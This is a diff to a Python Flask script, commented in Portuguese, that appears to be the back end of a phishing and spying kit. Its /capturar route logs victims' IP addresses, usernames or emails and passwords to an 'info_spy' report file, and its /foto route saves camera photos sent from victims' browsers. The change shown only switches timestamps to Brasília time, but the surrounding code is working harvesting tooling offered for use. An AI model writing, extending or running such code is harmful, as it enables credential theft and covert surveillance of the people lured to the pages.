@@ -1,5 +1,9 @@
 from flask import Flask, render_template_string, request, jsonify
 import datetime, base64, os, requests
+import pytz  # Biblioteca para fuso horário
+
+# --- CONFIGURAÇÃO DO FUSO HORÁRIO DE BRASÍLIA ---
+fuso_br = pytz.timezone('America/Sao_Paulo')
 
 # --- CONFIGURAÇÃO DO CAMINHO STORAGE ---
 if os.path.exists("/sdcard"):
@@ -15,7 +19,7 @@ if not os.path.exists(pasta_raiz):
         pasta_raiz = "info_spy"
         if not os.path.exists(pasta_raiz): os.makedirs(pasta_raiz)
 
-# --- MENU DE SELEÇÃO ---
+# --- MENU DE SELEÇÃO (MANTIDO INTACTO) ---
 def mostrar_menu():
     os.system('clear' if os.name == 'posix' else 'cls')
     print("="*40)
@@ -84,9 +88,10 @@ def capturar():
     dados = request.json
     ip_list = request.headers.getlist("X-Forwarded-For")
     ip = ip_list[0] if ip_list else request.remote_addr
-    agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
-    # Adicionado campo BATERIA aqui no log
+    # ATUALIZADO: Agora captura a hora de BRASÍLIA
+    agora = datetime.datetime.now(fuso_br).strftime("%Y-%m-%d %H:%M:%S")
+    
     log = (f"DATA: {agora} | IP: {ip}\n"
            f"TEMA: {pasta_tema.upper()} | BATERIA: {dados.get('bateria', 'N/A')}\n"
            f"EMAIL/USER: {dados.get('email')} | SENHA: {dados.get('pass')}\n"
@@ -96,7 +101,7 @@ def capturar():
     caminho_relatorio = os.path.join(pasta_raiz, "relatorio.txt")
     with open(caminho_relatorio, "a") as f:
         f.write(log)
-    print(f"[+] Evidência salva em: {caminho_relatorio}")
+    print(f"[+] Evidência salva em: {caminho_relatorio} (Horário BRT: {agora})")
     return jsonify({"status": "ok"}), 200
 
 @app.route('/foto', methods=['POST'])
@@ -105,7 +110,11 @@ def foto():
         dados = request.json
         img_str = dados['image'].split(",")[1]
         img_data = base64.b64decode(img_str)
-        nome_foto = f"foto_{datetime.datetime.now().strftime('%H%M%S')}.jpg"
+        
+        # ATUALIZADO: Nome da foto com hora de BRASÍLIA
+        hora_atual = datetime.datetime.now(fuso_br).strftime('%H%M%S')
+        nome_foto = f"foto_{hora_atual}.jpg"
+        
         caminho_foto = os.path.join(pasta_raiz, nome_foto)
         with open(caminho_foto, "wb") as f:
             f.write(img_data)
@@ -115,3 +124,4 @@ def foto():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
+
